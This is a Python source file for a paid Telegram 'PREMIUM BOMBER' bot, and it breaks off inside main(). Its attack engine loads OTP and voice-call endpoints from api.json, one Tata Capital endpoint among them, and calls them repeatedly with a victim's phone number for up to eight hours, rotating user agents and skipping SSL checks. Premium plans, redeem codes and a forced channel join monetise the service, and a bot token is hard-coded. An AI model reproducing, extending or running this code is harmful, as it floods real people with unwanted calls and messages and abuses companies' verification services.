import asyncio
import aiohttp
import time
import sqlite3
import random
import string
import os
import json
import logging
import socket
from aiohttp import web
from datetime import datetime, timedelta
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# =========================================
# ⚙️ CONFIGURATION
# =========================================
BOT_TOKEN = "8888980556:AAFGa5NCyt1myHiEkvolZhyA1NeES6kV5Tw" 
OWNER_ID = 5373454161

# 🎯 FORCED CHANNEL JOIN
REQUIRED_CHANNEL_ID = -1004437564076  # Replace with actual ID (e.g. -100...)
REQUIRED_CHANNEL_URL = "https://t.me/+BESyOiYWcClmYmNl"

# 🖼️ WALLPAPER
WELCOME_IMAGE = "https://ibb.co/B5wC7LP9"

# Logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# =========================================
# 📂 LOAD APIS FROM JSON FILE
# =========================================
def load_apis():
    try:
        with open('api.json', 'r') as f:
            apis = json.load(f)
            logger.info(f"Loaded {len(apis)} APIs from api.json")
            return apis
    except FileNotFoundError:
        logger.warning("api.json not found! Creating default structure...")
        # Create default API structure if file doesn't exist
        default_apis = [
            {
                "name": "Tata Capital Voice Call",
                "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json"
                },
                "body": {
                    "phone": "{no}",
                    "isOtpViaCallAtLogin": "true"
                }
            }
        ]
        with open('api.json', 'w') as f:
            json.dump(default_apis, f, indent=4)
        return default_apis
    except json.JSONDecodeError as e:
        logger.error(f"Error parsing api.json: {e}")
        return []

# Load APIs from JSON file
APIS = load_apis()

# DURATION OPTIONS (in minutes)
DURATION_OPTIONS = {
    "1": 1,      # 1 minute
    "5": 5,      # 5 minutes
    "15": 15,    # 15 minutes
    "30": 30,    # 30 minutes
    "60": 60,    # 1 hour
    "120": 120,  # 2 hours
    "240": 240,  # 4 hours
    "480": 480   # 8 hours
}

# =========================================
# 🗄️ DATABASE SYSTEM (Premium Only)
# =========================================
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('fusion_premium.db', check_same_thread=False)
        self.create_tables()
        # Store temporary attack data
        self.temp_attack_data = {}
        self.temp_admin_data = {}

    def create_tables(self):
        c = self.conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS users 
                    (user_id INTEGER PRIMARY KEY, 
                     premium_expiry TEXT, 
                     protected_number TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS redeem_codes 
                    (code TEXT PRIMARY KEY, 
                     days INTEGER, 
                     is_used INTEGER DEFAULT 0)''')
        self.conn.commit()

    def get_user(self, user_id):
        c = self.conn.cursor()
        c.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
        return c.fetchone()

    def add_user(self, user_id):
        if not self.get_user(user_id):
            c = self.conn.cursor()
            c.execute("INSERT INTO users (user_id) VALUES (?)", (user_id,))
            self.conn.commit()

    def is_premium(self, user_id):
        if user_id == OWNER_ID: 
            return True
        user = self.get_user(user_id)
        if user and user[1]:  # user[1] is expiry string
            try:
                expiry = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                if datetime.now() < expiry:
                    return True
                else:
                    return False
            except Exception as e:
                logger.error(f"Error parsing expiry date: {e}")
                return False
        return False

    def add_premium(self, user_id, days):
        current = datetime.now()
        user = self.get_user(user_id)
        
        # If user exists and has an expiry date that's in the future, extend from that date
        if user and user[1]:
            try:
                stored = datetime.strptime(user[1], "%Y-%m-%d %H:%M:%S")
                if stored > current: 
                    current = stored
            except:
                pass  # If date parsing fails, use current time
        
        new_exp = current + timedelta(days=days)
        str_exp = new_exp.strftime("%Y-%m-%d %H:%M:%S")
        
        c = self.conn.cursor()
        # Ensure user exists in database
        if not user:
            c.execute("INSERT INTO users (user_id, premium_expiry) VALUES (?, ?)", (user_id, str_exp))
        else:
            c.execute("UPDATE users SET premium_expiry=? WHERE user_id=?", (str_exp, user_id))
        self.conn.commit()
        return str_exp

    def generate_code(self, days):
        code = "PREMIUM-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        c = self.conn.cursor()
        try:
            c.execute("INSERT INTO redeem_codes (code, days) VALUES (?, ?)", (code, days))
            self.conn.commit()
            return code
        except sqlite3.IntegrityError:
            # If code already exists (very unlikely), generate a new one
            logger.warning(f"Code collision for {code}, generating new one")
            return self.generate_code(days)

    def redeem(self, user_id, code):
        c = self.conn.cursor()
        # First, check if code exists and is unused
        c.execute("SELECT days, is_used FROM redeem_codes WHERE code=?", (code,))
        res = c.fetchone()
        
        if not res:
            return False, 0, None  # Code doesn't exist
        
        days, is_used = res
        
        if is_used == 1:
            return False, 0, None  # Code already used
        
        # Mark as used FIRST
        try:
            c.execute("UPDATE redeem_codes SET is_used=1 WHERE code=?", (code,))
            
            # Then give premium
            exp_date = self.add_premium(user_id, days)
            
            self.conn.commit()
            return True, days, exp_date
        except Exception as e:
            self.conn.rollback()
            logger.error(f"Error redeeming code: {e}")
            return False, 0, None

    def protect(self, user_id, number):
        c = self.conn.cursor()
        c.execute("UPDATE users SET protected_number=? WHERE user_id=?", (number, user_id))
        self.conn.commit()

    def unprotect(self, user_id):
        c = self.conn.cursor()
        c.execute("UPDATE users SET protected_number=NULL WHERE user_id=?", (user_id,))
        self.conn.commit()

    def is_protected(self, number):
        c = self.conn.cursor()
        c.execute("SELECT user_id FROM users WHERE protected_number=?", (number,))
        return c.fetchone() is not None

    def get_all_users(self):
        c = self.conn.cursor()
        c.execute("SELECT user_id FROM users")
        return [row[0] for row in c.fetchall()]

    def get_stats(self):
        c = self.conn.cursor()
        u = c.execute("SELECT COUNT(*) FROM users").fetchone()[0]
        total_codes = c.execute("SELECT COUNT(*) FROM redeem_codes").fetchone()[0]
        return u, total_codes

    # Temporary attack data storage
    def set_attack_data(self, user_id, phone):
        self.temp_attack_data[user_id] = {
            'phone': phone,
            'timestamp': time.time()
        }

    def get_attack_data(self, user_id):
        data = self.temp_attack_data.get(user_id)
        if data and time.time() - data['timestamp'] < 300:  # 5 minutes expiry
            return data['phone']
        else:
            # Clean up expired data
            if user_id in self.temp_attack_data:
                del self.temp_attack_data[user_id]
            return None

    def clear_attack_data(self, user_id):
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]

    # Admin data storage
    def set_admin_data(self, user_id, data_type, value):
        if user_id not in self.temp_admin_data:
            self.temp_admin_data[user_id] = {}
        self.temp_admin_data[user_id][data_type] = {
            'value': value,
            'timestamp': time.time()
        }

    def get_admin_data(self, user_id, data_type):
        data = self.temp_admin_data.get(user_id, {}).get(data_type)
        if data and time.time() - data['timestamp'] < 300:  # 5 minutes expiry
            return data['value']
        return None

    def clear_admin_data(self, user_id, data_type):
        if user_id in self.temp_admin_data and data_type in self.temp_admin_data[user_id]:
            del self.temp_admin_data[user_id][data_type]

# =========================================
# 🌐 WEB SERVER
# =========================================
async def web_server():
    async def handle(request): 
        # Log pings so we can see if the panel is actually reaching us
        logger.info(f"📩 Health check received from {request.remote}")
        return web.Response(text="Bot is Alive!")
    
    app = web.Application()
    app.router.add_get('/', handle)
    app.router.add_get('/health', handle) # Some monitors prefer /health
    runner = web.AppRunner(app)
    await runner.setup()
    
    # Log all environment variables related to ports for debugging
    for k, v in os.environ.items():
        if any(x in k for x in ["PORT", "ADDR", "IP", "SERVER"]):
            logger.info(f"🔎 Found Env: {k} = {v}")

    # Try multiple panel environment variables
    env_port = os.getenv('PORT') or os.getenv('SERVER_PORT') or os.getenv('WEB_PORT')
    ports_to_try = []
    
    if env_port:
        try:
            ports_to_try.append(int(env_port))
        except:
            pass
    
    # Common Pterodactyl/Wispbyte defaults
    ports_to_try.extend([8080, 8081, 8082, 3000, 5000, 25565])
    
    # Log environment info to help debug port issues
    logger.info(f"Environment PORT: {os.getenv('PORT')}, SERVER_PORT: {os.getenv('SERVER_PORT')}")
    
    for port in ports_to_try:
        try:
            site = web.TCPSite(runner, '0.0.0.0', port)
            await site.start()
            logger.info(f"Web Server Running on Port {port}")
            return
        except OSError as e:
            if e.errno == 98:  # Address already in use
                continue
            else:
                logger.error(f"Error starting server on port {port}: {e}")
    
    logger.warning("Could not start web server (all ports busy)")

# =========================================
# 💣 ATTACK ENGINE
# =========================================
class AttackManager:
    def __init__(self):
        self.active_attacks = {} 
        self.active_tasks = {} # Track asyncio tasks
        self.db = Database()
        self.session = None
        self.semaphore = None # Will be initialized in get_session
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36"
        ]

    def reload_apis(self):
        """Reload APIs from api.json"""
        global APIS
        APIS = load_apis()
        return len(APIS)

    async def get_session(self):
        if self.semaphore is None:
            self.semaphore = asyncio.Semaphore(25)
        if self.session is None or self.session.closed:
            self.session = aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False, limit=100))
        return self.session

    async def close_session(self):
        if self.session and not self.session.closed:
            await self.session.close()

    async def _make_request(self, session, api, phone):
        """Make a single API request with error handling"""
        try:
            url = api['url'].replace('{no}', phone)
            headers = api.get('headers', {}).copy()
            headers['User-Agent'] = random.choice(self.user_agents)
            
            # Add timeout configuration
            timeout = aiohttp.ClientTimeout(total=5)
            
            if api['method'].upper() == 'GET':
                async with session.get(url, headers=headers, timeout=timeout, ssl=False) as response:
                    await response.read()
                    return True
            elif api['method'].upper() == 'POST':
                body = {}
                if api.get('body'):
                    for key, value in api['body'].items():
                        if isinstance(value, str):
                            body[key] = value.replace('{no}', phone)
                        else:
                            body[key] = value
                
                content_type = headers.get('Content-Type', '')
                if 'application/json' in content_type:
                    async with session.post(url, headers=headers, json=body, timeout=timeout, ssl=False) as response:
                        await response.read()
                        return True
                else:
                    async with session.post(url, headers=headers, data=body, timeout=timeout, ssl=False) as response:
                        await response.read()
                        return True
        except asyncio.TimeoutError:
            pass
        except Exception as e:
            pass
        return False

    async def _run_attack_engine(self, user_id, phone, duration):
        try:
            end_time = time.time() + (duration * 60)
            session = await self.get_session()
            
            while time.time() < end_time:
                if user_id not in self.active_attacks or not self.active_attacks[user_id]["running"]: 
                    break
                
                # Process APIs in smaller batches to prevent CPU spikes / task explosion
                # The semaphore still limits net concurrency to 25
                batch_size = 50
                for i in range(0, len(APIS), batch_size):
                    if user_id not in self.active_attacks or not self.active_attacks[user_id]["running"]:
                        break
                        
                    batch = APIS[i:i+batch_size]
                    
                    async def bounded_request(api):
                        if self.semaphore is None:
                            self.semaphore = asyncio.Semaphore(25)
                        async with self.semaphore:
                            return await self._make_request(session, api, phone)

                    tasks = [asyncio.create_task(bounded_request(api)) for api in batch]
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                
                # Reasonable delay between rounds to prevent server overload
                await asyncio.sleep(3.0) # Increased to 3s for better stability
        except asyncio.CancelledError:
            logger.info(f"Attack for user {user_id} cancelled.")
        finally:
            if user_id in self.active_attacks:
                del self.active_attacks[user_id]
            if user_id in self.active_tasks:
                del self.active_tasks[user_id]

    async def start_attack(self, user_id, phone, duration):
        if user_id in self.active_attacks: 
            return False
        
        # Check if user is premium
        if not self.db.is_premium(user_id):
            return False
        
        self.active_attacks[user_id] = {
            "phone": phone,
            "end_time": time.time() + (duration * 60),
            "running": True
        }

        # Launch and track attack task
        task = asyncio.create_task(self._run_attack_engine(user_id, phone, duration))
        self.active_tasks[user_id] = task
        return True

    async def stop_attack(self, user_id):
        if user_id in self.active_tasks:
            self.active_tasks[user_id].cancel()
            # The _run_attack_engine finally block will handle cleanup
            return True
        if user_id in self.active_attacks:
            self.active_attacks[user_id]["running"] = False
            del self.active_attacks[user_id]
            return True
        return False

    async def stop_all_attacks(self):
        logger.info("Stopping all active attacks...")
        for uid, task in list(self.active_tasks.items()):
            task.cancel()
        if self.active_tasks:
            # Short wait for tasks to finish cancelling
            await asyncio.gather(*self.active_tasks.values(), return_exceptions=True)
        logger.info("All attacks stopped.")

manager = AttackManager()

# =========================================
# 📢 CHANNEL MEMBERSHIP CHECK
# =========================================
async def check_channel_membership(user_id, context):
    """Check if user is member of required channel"""
    try:
        member = await context.bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        # member.status can be: 'creator', 'administrator', 'member', 'restricted', 'left', 'kicked'
        if member.status in ['creator', 'administrator', 'member']:
            return True
        return False
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        logger.warning(f"Please verify {REQUIRED_CHANNEL_ID} is correct and Bot is ADMIN in {REQUIRED_CHANNEL_URL}")
        # If check fails due to incorrect ID, we might want to let them pass or block.
        # Blocking is safer for the owner's intent.
        return False

# =========================================
# 🖥️ UI & HANDLERS
# =========================================
def main_kb(user_id):
    kb = [
        [KeyboardButton("🚀 Call"), KeyboardButton("📊 Status")],
        [KeyboardButton("👤 Account"), KeyboardButton("❓ Help")],
        [KeyboardButton("🛡 Protect"), KeyboardButton("🔓 Unprotect")],
        [KeyboardButton("💳 Plans"), KeyboardButton("🔑 Redeem")]
    ]
    if user_id == OWNER_ID:
        kb.append([KeyboardButton("👑 Admin Panel")])
    return ReplyKeyboardMarkup(kb, resize_keyboard=True)

def admin_kb():
    kb = [
        [InlineKeyboardButton("🔑 Gen Key", callback_data="adm_genkey"), InlineKeyboardButton("📢 Broadcast", callback_data="adm_broadcast")],
        [InlineKeyboardButton("📊 Stats", callback_data="adm_stats")]
    ]
    return InlineKeyboardMarkup(kb)

def duration_kb():
    """Keyboard for duration selection"""
    kb = [
        [
            InlineKeyboardButton("1 Min", callback_data="dur_1"),
            InlineKeyboardButton("5 Min", callback_data="dur_5"),
            InlineKeyboardButton("15 Min", callback_data="dur_15")
        ],
        [
            InlineKeyboardButton("30 Min", callback_data="dur_30"),
            InlineKeyboardButton("1 Hour", callback_data="dur_60"),
            InlineKeyboardButton("2 Hours", callback_data="dur_120")
        ],
        [
            InlineKeyboardButton("4 Hours", callback_data="dur_240"),
            InlineKeyboardButton("8 Hours", callback_data="dur_480"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")
        ]
    ]
    return InlineKeyboardMarkup(kb)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    manager.db.add_user(user_id)
    
    # Check if user is member of required channel (skip for owner)
    if user_id != OWNER_ID:
        is_member = await check_channel_membership(user_id, context)
        if not is_member:
            join_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join Channel", url=REQUIRED_CHANNEL_URL)],
                [InlineKeyboardButton("✅ I Joined, Verify", callback_data="verify_join")]
            ])
            await update.message.reply_photo(
                WELCOME_IMAGE,
                caption=(
                    "⚠️ **CHANNEL JOIN REQUIRED**\\n\\n"
                    "To use this bot, you must join our official channel first.\\n\\n"
                    "**Steps:**\\n"
                    "1️⃣ Click 'Join Channel' button below\\n"
                    "2️⃣ Join the channel\\n"
                    "3️⃣ Click 'I Joined, Verify' button\\n\\n"
                    "After joining, you'll get full access to the bot!"
                ),
                reply_markup=join_kb,
                parse_mode="Markdown"
            )
            return
    
    # Check if user is premium
    if not manager.db.is_premium(user_id):
        welcome_msg = (
            "👋 **Welcome to PREMIUM BOMBER!**\n\n"
            "⚡ **Premium Only System**\n"
            "🚀 **Custom Attack Duration**\n"
            "📦 **JSON API Configuration**\n\n"
            "⛔ **You are NOT a premium user!**\n"
            "Buy a premium plan to use all features."
             "CREATED BY MADHU **\n\n"
        )
    else:
        welcome_msg = (
            "👋 **Welcome to PREMIUM BOMBER!**\n\n"
            "⚡ **Premium Only System**\n"
            "🚀 **Custom Attack Duration**\n"
            "📦 **JSON API Configuration**\n\n"
            "✅ **You are PREMIUM user!**\n"
            "Enjoy all premium features!"
             "CREATED BY MADHU **\n\n"
        )
    
    await update.message.reply_photo(
        WELCOME_IMAGE, 
        caption=welcome_msg,
        reply_markup=main_kb(user_id),
        parse_mode="Markdown"
    )

async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text
    
    # Add user to database if not exists
    manager.db.add_user(user_id)
    
    # Check if user is member of required channel (skip for owner)
    if user_id != OWNER_ID:
        is_member = await check_channel_membership(user_id, context)
        if not is_member:
            join_kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("📢 Join Channel", url=REQUIRED_CHANNEL_URL)],
                [InlineKeyboardButton("✅ I Joined, Verify", callback_data="verify_join")]
            ])
            await update.message.reply_text(
                "⚠️ **CHANNEL JOIN REQUIRED**\\n\\n"
                "Please join our channel first to use this bot.\\n"
                "Click the button below to join!",
                reply_markup=join_kb,
                parse_mode="Markdown"
            )
            return
    
    # ================== MENU BUTTONS ==================
    
    if text == "🚀 Call":
        # Check if user is premium
        if not manager.db.is_premium(user_id):
            await update.message.reply_text(
                "⛔ **PREMIUM REQUIRED!**\n\n"
                "You need a premium subscription to use this feature.\n\n"
                "**Options:**\n"
                "• Click '💳 Plans' to view premium plans\n"
                "• Use '🔑 Redeem' if you have a premium code\n"
                "• Contact admin for purchase\n"
                f"• Admin: @BOT_CLONER (ID: {OWNER_ID})",
                parse_mode="Markdown",
                reply_markup=main_kb(user_id)
            )
            return
        
        # Check if user already has active attack
        if user_id in manager.active_attacks: 
            await update.message.reply_text("⚠️ **You already have an active attack!**\nClick '📊 Status' to check or stop it.")
            return
        
        # Ask for number
        await update.message.reply_text(
            "📞 **Enter 10-digit Phone Number:**\n"
            "Example: `9876543210`\n\n"
            "Type /cancel to cancel",
            parse_mode="Markdown",
            reply_markup=main_kb(user_id)
        )
        # Store state
        context.user_data['waiting_for_number'] = True
        return

    elif text == "📊 Status":
        if user_id in manager.active_attacks:
            info = manager.active_attacks[user_id]
            left = int((info['end_time'] - time.time()) / 60)
            total_minutes = int((info['end_time'] - info['end_time'] + (left * 60)) / 60)
            msg = (
                f"🔥 **ATTACK RUNNING**\n"
                f"🎯 `{info['phone']}`\n"
                f"⏰ Duration: {total_minutes} Minutes\n"
                f"⏳ Left: {left} Minutes\n"
                f"📡 Using {len(APIS)} APIs"
            )
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop")]])
            await update.message.reply_text(msg, reply_markup=kb, parse_mode="Markdown")
        else: 
            await update.message.reply_text("💤 **No active attacks.**", reply_markup=main_kb(user_id))
        return

    elif text == "💳 Plans":
        msg = (
            "💎 **PREMIUM SUBSCRIPTION PLANS**\n\n"
            "🔹 **Standard Plan (₹149)**\n"
            "   - Duration: 30 Days\n"
            "   - Attack Duration: Up to 8 Hours\n"
            "   - Unlimited Attacks\n"
            "   - Number Protection\n\n"
            "🔹 **Pro Plan (₹299)**\n"
            "   - Duration: 90 Days\n"
            "   - Priority Support\n"
            "   - All Premium Features\n\n"
            f"**Contact Admin:** [Click Here](tg://user?id={OWNER_ID})"
        )
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("👤 Contact Admin", url=f"tg://user?id={OWNER_ID}")]])
        await update.message.reply_text(msg, reply_markup=kb, parse_mode="Markdown")
        return

    elif text == "👑 Admin Panel":
        if user_id == OWNER_ID: 
            await update.message.reply_text("👑 **Admin Panel:**", reply_markup=admin_kb())
        else: 
            await update.message.reply_text("❌ Owner Only.")
        return

    elif text == "🔑 Redeem":
        await update.message.reply_text(
            "🔑 **Send Premium Code:**\n"
            "Format: `PREMIUM-XXXXXXX` (8 random characters)\n\n"
            "Example: `PREMIUM-A1B2C3D4`\n\n"
            "Type /cancel to cancel",
            parse_mode="Markdown",
            reply_markup=main_kb(user_id)
        )
        context.user_data['waiting_for_redeem'] = True
        return

    elif text == "🛡 Protect":
        # Check if user is premium
        if not manager.db.is_premium(user_id):
            await update.message.reply_text("⛔ Premium users only!", reply_markup=main_kb(user_id))
            return
        
        await update.message.reply_text(
            "🛡 **Enter 10-digit Number to Protect:**\n"
            "Example: `9876543210`\n\n"
            "Type /cancel to cancel",
            parse_mode="Markdown",
            reply_markup=main_kb(user_id)
        )
        context.user_data['waiting_for_protect'] = True
        return

    elif text == "🔓 Unprotect":
        # Check if user is premium
        if not manager.db.is_premium(user_id):
            await update.message.reply_text("⛔ Premium users only!", reply_markup=main_kb(user_id))
            return
        
        manager.db.unprotect(user_id)
        await update.message.reply_text("🔓 **Number unprotected.**", reply_markup=main_kb(user_id))
        return

    elif text == "👤 Account":
        is_prem = manager.db.is_premium(user_id)
        user = manager.db.get_user(user_id)
        expiry = user[1] if user and user[1] else "Not Premium"
        status = "💎 Premium" if is_prem else "⛔ Free"
        
        msg = (
            f"👤 **Account Information**\n"
            f"🆔 `{user_id}`\n"
            f"{status}\n"
            f"📅 Expiry: {expiry}\n"
            f"📊 APIs Loaded: {len(APIS)}"
        )
        await update.message.reply_text(msg, parse_mode="Markdown", reply_markup=main_kb(user_id))
        return

    elif text == "❓ Help":
        help_msg = (
            "🆘 **Help & Support**\n\n"
            "**Available Features:**\n"
            "• 🚀 Call - Start attack (Premium Only)\n"
            "• 📊 Status - Check attack status\n"
            "• 👤 Account - View account info\n"
            "• 💳 Plans - View premium plans\n"
            "• 🔑 Redeem - Redeem premium code\n"
            "• 🛡 Protect - Protect your number (Premium)\n"
            "• 🔓 Unprotect - Remove protection (Premium)\n\n"
            f"**Need help?** Contact: [Admin](tg://user?id={OWNER_ID})"
        )
        await update.message.reply_text(help_msg, parse_mode="Markdown", reply_markup=main_kb(user_id))
        return

    # ================== INPUT HANDLING ==================
    
    # Handle number input for attack
    elif context.user_data.get('waiting_for_number') and text.isdigit() and len(text) == 10:
        # Clear state
        context.user_data['waiting_for_number'] = False
        
        # Check if number is protected
        if manager.db.is_protected(text):
            await update.message.reply_text("🛡 **This number is protected!**", reply_markup=main_kb(user_id))
            return
        
        # Store the number for callback handler
        manager.db.set_attack_data(user_id, text)
        
        # Ask for duration
        await update.message.reply_text(
            f"📞 **Target Number:** `{text}`\n\n"
            "⏰ **Select Attack Duration:**",
            reply_markup=duration_kb(),
            parse_mode="Markdown"
        )
        return
    
    # Handle redeem code input
    elif context.user_data.get('waiting_for_redeem'):
        context.user_data['waiting_for_redeem'] = False
        code = text.strip().upper()
        
        # Check if it's a valid premium code format
        if not code.startswith("PREMIUM-") or len(code) != 16:
            await update.message.reply_text(
                "❌ Invalid code format.\n"
                "Should be: PREMIUM- followed by 8 characters\n"
                "Example: `PREMIUM-A1B2C3D4`", 
                parse_mode="Markdown",
                reply_markup=main_kb(user_id)
            )
            return
        
        success, days, exp = manager.db.redeem(user_id, code)
        if success: 
            await update.message.reply_text(
                f"✅ **Premium Activated!**\n"
                f"💎 +{days} Days\n"
                f"📅 Expiry: {exp}\n\n"
                f"🎉 Now you can use all premium features!",
                parse_mode="Markdown",
                reply_markup=main_kb(user_id)
            )
        else: 
            await update.message.reply_text(
                "❌ Invalid or already used code.\n"
                "Make sure you entered the code correctly.",
                reply_markup=main_kb(user_id)
            )
        return
    
    # Handle protect number input
    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
        context.user_data['waiting_for_protect'] = False
        manager.db.protect(user_id, text)
        await update.message.reply_text(f"🛡 **Number Protected:** `{text}`", 
                                       parse_mode="Markdown",
                                       reply_markup=main_kb(user_id))
        return
    
    # Handle admin gen key input
    elif context.user_data.get('waiting_for_genkey') and user_id == OWNER_ID:
        context.user_data['waiting_for_genkey'] = False
        try:
            days = int(text.strip())
            if days <= 0:
                await update.message.reply_text("❌ Days must be positive.")
            else:
                code = manager.db.generate_code(days)
                await update.message.reply_text(
                    f"🔑 **Premium Code Generated**\n\n"
                    f"**Code:** `{code}`\n"
                    f"**Days:** {days}\n"
                    f"**Format:** PREMIUM- + 8 characters\n\n"
                    f"Share this code with the user.",
                    parse_mode="Markdown"
                )
        except ValueError:
            await update.message.reply_text("❌ Enter a valid number.")
        return
    
    # Handle admin broadcast input
    elif context.user_data.get('waiting_for_broadcast') and user_id == OWNER_ID:
        context.user_data['waiting_for_broadcast'] = False
        users = manager.db.get_all_users()
        await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
        
        success = 0
        failed = 0
        
        for uid in users:
            try: 
                await context.bot.send_message(uid, text)
                success += 1
            except: 
                failed += 1
            await asyncio.sleep(0.1)  # Avoid rate limiting
            
        await update.message.reply_text(
            f"✅ **Broadcast Complete**\n"
            f"✅ Success: {success}\n"
            f"❌ Failed: {failed}",
            parse_mode="Markdown"
        )
        return
    
    # Handle cancel command
    elif text.lower() == '/cancel':
        # Clear all waiting states
        for key in ['waiting_for_number', 'waiting_for_redeem', 'waiting_for_protect', 
                   'waiting_for_genkey', 'waiting_for_broadcast']:
            if key in context.user_data:
                context.user_data[key] = False
        
        # Clear attack data
        manager.db.clear_attack_data(user_id)
        
        await update.message.reply_text("❌ Operation cancelled.", reply_markup=main_kb(user_id))
        return
    
    # If none of the above, show help
    elif text and not text.startswith('/'):
        await update.message.reply_text(
            "🤔 **Not sure what you want?**\n\n"
            "Use the menu buttons or type /start to see all options.",
            reply_markup=main_kb(user_id)
        )

async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all callback queries"""
    query = update.callback_query
    await query.answer()
    uid = query.from_user.id
    data = query.data
    
    # Handle channel join verification
    if data == "verify_join":
        is_member = await check_channel_membership(uid, context)
        if is_member:
            await query.edit_message_caption(
                caption=(
                    "✅ **Verification Successful!**\\n\\n"
                    "Thank you for joining our channel!\\n"
                    "You can now use all bot features.\\n\\n"
                    "Type /start to begin!"
                ),
                parse_mode="Markdown"
            )
        else:
            await query.answer(
                "❌ You haven't joined the channel yet!\\n"
                "Please join first, then click verify.",
                show_alert=True
            )
        return
    
    # Handle duration selection
    if data.startswith("dur_"):
        # Get stored phone number from database
        phone = manager.db.get_attack_data(uid)
        
        if not phone:
            await query.edit_message_text("❌ Session expired. Please start again by clicking '🚀 Call'.")
            return
        
        # Get duration from callback data
        dur_key = data.split("_")[1]
        if dur_key not in DURATION_OPTIONS:
            await query.answer("❌ Invalid duration", show_alert=True)
            return
        
        duration = DURATION_OPTIONS[dur_key]
        
        # Start attack
        success = await manager.start_attack(uid, phone, duration)
        
        if success:
            # Format duration for display
            if duration < 60:
                dur_display = f"{duration} Minutes"
            elif duration == 60:
                dur_display = "1 Hour"
            elif duration < 120:
                dur_display = f"{duration/60:.1f} Hours"
            else:
                dur_display = f"{duration//60} Hours"
            
            # Update message
            await query.edit_message_text(
                f"🚀 **Attack Started Successfully!**\n\n"
                f"🎯 **Target:** `{phone}`\n"
                f"⏰ **Duration:** {dur_display}\n"
                f"📡 **APIs:** {len(APIS)}\n"
                f"👤 **User:** Premium\n\n"
                f"⚡ **Attack will stop automatically after {dur_display}**",
                parse_mode="Markdown"
            )
            
            # Send separate status message
            msg = (
                f"🔥 **ATTACK RUNNING**\n"
                f"🎯 `{phone}`\n"
                f"⏰ Duration: {duration} Minutes\n"
                f"📡 Using {len(APIS)} APIs"
            )
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP ATTACK", callback_data="stop")]])
            await query.message.reply_text(msg, reply_markup=kb, parse_mode="Markdown")
        else:
            await query.edit_message_text("❌ Failed to start attack. Please try again.")
        
        # Clear stored data
        manager.db.clear_attack_data(uid)
    
    elif data == "cancel_attack":
        manager.db.clear_attack_data(uid)
        await query.edit_message_text("❌ Attack cancelled.")
    
    elif data == "stop":
        if await manager.stop_attack(uid):
            await query.edit_message_text("🛑 **Attack Stopped Successfully!**")
        else:
            await query.answer("❌ No active attack found.", show_alert=True)
    
    elif data == "adm_genkey" and uid == OWNER_ID:
        # Store the callback message for later use
        context.user_data['waiting_for_genkey'] = True
        await query.message.reply_text("🔑 **Enter number of days for premium:**\nExample: `30`\n\nType /cancel to cancel", parse_mode="Markdown")
    
    elif data == "adm_broadcast" and uid == OWNER_ID:
        context.user_data['waiting_for_broadcast'] = True
        await query.message.reply_text("📢 **Enter message to broadcast:**\n\nType /cancel to cancel")
    
    elif data == "adm_stats" and uid == OWNER_ID:
        u, c = manager.db.get_stats()
        # Count unused codes
        unused_codes = manager.db.conn.cursor().execute(
            "SELECT COUNT(*) FROM redeem_codes WHERE is_used=0"
        ).fetchone()[0]
        await query.answer(f"👥 Total Users: {u}\n🔑 Total Codes: {c}\n✅ Unused Codes: {unused_codes}", show_alert=True)

# =========================================
# 🛠️ SYSTEM COMMANDS
# =========================================
async def reapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /reapi command to reload API system"""
    user_id = update.effective_user.id
    if user_id != OWNER_ID:
        return
    
    count = manager.reload_apis()
    await update.message.reply_text(
        f"♻️ **API Connecting System Reset**\n\n"
        f"✅ Loaded: `{count}` APIs\n"
        f"📡 Connection: `Stable`",
        parse_mode="Markdown"
    )

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /cancel command"""
    user_id = update.effective_user.id
    
    # Clear all waiting states
    for key in ['waiting_for_number', 'waiting_for_redeem', 'waiting_for_protect', 
               'waiting_for_genkey', 'waiting_for_broadcast']:
        if key in context.user_data:
            context.user_data[key] = False
    
    # Clear attack data
    manager.db.clear_attack_data(user_id)
    
    await update.message.reply_text("❌ Operation cancelled.", reply_markup=main_kb(user_id))

# =========================================
# 🚀 MAIN FUNCTION
# =========================================
def main():
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel_command))
